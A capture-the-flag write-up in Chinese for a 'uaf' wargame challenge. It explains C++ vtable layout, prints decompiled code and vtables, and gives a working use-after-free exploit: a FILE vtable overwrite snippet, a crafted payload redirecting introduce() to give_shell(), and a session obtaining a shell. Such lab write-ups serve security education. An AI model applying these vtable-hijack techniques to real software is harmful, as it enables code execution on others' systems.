# uaf


>在 C++ 中，如果類中有虛函數，那麼它就會有一個虛函數表的指針 __vfptr，存儲在類對象最開始的內存數據中，之後存儲類中的成員變量的內存數據。 

>對於子類，最開始的內存數據存儲著父類對象的拷貝（包括父類虛函數表指針和成員變量），之後存儲子類自己的成員變量數據。 

>當子類重載父類虛函數時，修改虛函數表 (vtable) 同名函數地址，改為指向子類的函數地址，若子類中有新的虛函數，在 vtable 尾部添加

vtable 在 &物件+8

eg
```c
　　FILE *fp;
　　long long *vtable_addr,*fake_vtable;
　　fp=fopen("123.txt","rw");
　　fake_vtable=malloc(0x40);
　　vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset
　　vtable_addr[0]=(long long)fake_vtable;

```



目標是 give_shell()

修改 vtable introduce 讓他去呼叫 give_shell


m w 的指標在 free 過還存在，控制寫入的東西去把 introduce 指向 give_shell

vtable 裡面存三個位置 

introduce 呼叫的時候是  *obj + 8 ，也就是第0個函數

所以構造 (give_shell-8) + 8



vtable
```c
.rodata:0000000000401540 ; `vtable for'Woman
.rodata:0000000000401540 _ZTV5Woman      dq 0                    ; offset to this
.rodata:0000000000401548                 dq offset _ZTI5Woman    ; `typeinfo for'Woman
.rodata:0000000000401550 off_401550      dq offset _ZN5Human10give_shellEv
.rodata:0000000000401550                                         ; DATA XREF: Woman::Woman(std::string,int)+24↑o
.rodata:0000000000401550                                         ; Human::give_shell(void)
.rodata:0000000000401558                 dq offset _ZN5Woman9introduceEv ; Woman::introduce(void)
.rodata:0000000000401560                 public _ZTV3Man ; weak


.rodata:0000000000401560 ; `vtable for'Man
.rodata:0000000000401560 _ZTV3Man        dq 0                    ; offset to this
.rodata:0000000000401568                 dq offset _ZTI3Man      ; `typeinfo for'Man
.rodata:0000000000401570 off_401570      dq offset _ZN5Human10give_shellEv
.rodata:0000000000401570                                         ; DATA XREF: Man::Man(std::string,int)+24↑o
.rodata:0000000000401570                                         ; Human::give_shell(void)
.rodata:0000000000401578                 dq offset _ZN3Man9introduceEv ; Man::introduce(void)
.rodata:0000000000401580                 public _ZTV5Human ; weak


.rodata:0000000000401580 ; `vtable for'Human
.rodata:0000000000401580 _ZTV5Human      dq 0                    ; offset to this
.rodata:0000000000401588                 dq offset _ZTI5Human    ; `typeinfo for'Human
.rodata:0000000000401590 off_401590      dq offset _ZN5Human10give_shellEv
.rodata:0000000000401590                                         ; DATA XREF: Human::Human(void)+10↑o
.rodata:0000000000401590                                         ; Human::~Human()+10↑o
.rodata:0000000000401590                                         ; Human::give_shell(void)
.rodata:0000000000401598                 dq offset _ZN5Human9introduceEv ; Human::introduce(void)
.rodata:00000000004015A0                 public _ZTS5Woman ; weak

```


```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  Human *nn_human_ptr_man; // rbx
  __int64 v4; // rdx
  Human *v5; // rbx
  int v6; // eax
  __int64 v7; // rax
  Human *v8; // rbx
  Human *v9; // rbx
  char v10[16]; // [rsp+10h] [rbp-50h] BYREF
  char v11[8]; // [rsp+20h] [rbp-40h] BYREF
  Human *nn_human_ptr_man1; // [rsp+28h] [rbp-38h]
  Human *nn_human_ptr_woman; // [rsp+30h] [rbp-30h]
  size_t nbytes; // [rsp+38h] [rbp-28h]
  void *buf; // [rsp+40h] [rbp-20h]
  int nn_input; // [rsp+48h] [rbp-18h] BYREF
  char v17; // [rsp+4Eh] [rbp-12h] BYREF
  char v18[17]; // [rsp+4Fh] [rbp-11h] BYREF

  std::allocator<char>::allocator(&v17, argv, envp);
  std::string::string(v10, "Jack", &v17);
  nn_human_ptr_man = (Human *)operator new(24uLL);  //size 24
  Man::Man(nn_human_ptr_man, v10, 25LL);
  nn_human_ptr_man1 = nn_human_ptr_man;
  std::string::~string((std::string *)v10);
  std::allocator<char>::~allocator(&v17);
  std::allocator<char>::allocator(v18, v10, v4);
  std::string::string(v11, "Jill", v18);
  v5 = (Human *)operator new(24uLL);
  Woman::Woman(v5, v11, 21LL);
  nn_human_ptr_woman = v5;
  std::string::~string((std::string *)v11);
  std::allocator<char>::~allocator(v18);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "1. use\n2. after\n3. free\n");
        std::istream::operator>>(&std::cin, &nn_input);
        if ( nn_input != 2 )
          break;
        nbytes = atoi(argv[1]);
        buf = (void *)operator new[](nbytes);
        v6 = open(argv[2], 0);
        read(v6, buf, nbytes);
        v7 = std::operator<<<std::char_traits<char>>(&std::cout, "your data is allocated");
        std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
      }
      if ( nn_input == 3 )
        break;
      if ( nn_input == 1 )
      {
        (*(void (__fastcall **)(Human *))(*(_QWORD *)nn_human_ptr_man1 + 8LL)) // +8 call introduce
        (nn_human_ptr_man1);
        (*(void (__fastcall **)(Human *))(*(_QWORD *)nn_human_ptr_woman + 8LL))(nn_human_ptr_woman);
      }
    }
    v8 = nn_human_ptr_man1;
    if ( nn_human_ptr_man1 )
    {
      Human::~Human(nn_human_ptr_man1);
      operator delete(v8);
    }
    v9 = nn_human_ptr_woman;
    if ( nn_human_ptr_woman )
    {
      Human::~Human(nn_human_ptr_woman);
      operator delete(v9);
    }
  }
```






```
python -c 'print "\x68\x15\x40\x00\x00\x00\x00\x00"+ 'a'*16 ' > /tmp/h


uaf@pwnable:~$ ./uaf 24 /tmp/h
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ id
uid=1029(uaf) gid=1029(uaf) egid=1030(uaf_pwn) groups=1030(uaf_pwn),1029(uaf)
$ pwd  
/home/uaf
$ ls
flag  uaf  uaf.cpp
```